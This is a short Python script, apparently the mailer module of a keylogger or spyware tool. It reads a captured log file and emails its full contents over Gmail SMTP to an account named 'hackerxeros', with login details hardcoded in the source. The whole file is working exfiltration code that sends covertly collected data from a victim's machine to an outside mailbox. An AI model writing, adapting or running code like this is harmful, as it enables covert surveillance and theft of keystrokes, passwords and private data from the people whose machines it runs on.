import smtplib
import filemanager

def main():
    # Specifying the from and to addresses

    sender = 'hackerxeros@gmail.com'
    receiver  = 'hackerxeros@gmail.com'
    username = 'hackerxeros' #without @gmail.com only write Google Id.
    password = 'pass'

    # Writing the message (this message will appear in the email)
    log = open(filemanager.getlogfilepath(filemanager.getlogfilename()), mode='r', encoding='utf-8').read().encode()

    # Sending the mail

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(username,password)
    server.sendmail(sender, receiver, log)
    server.quit()

if __name__ == "__main__":
    main()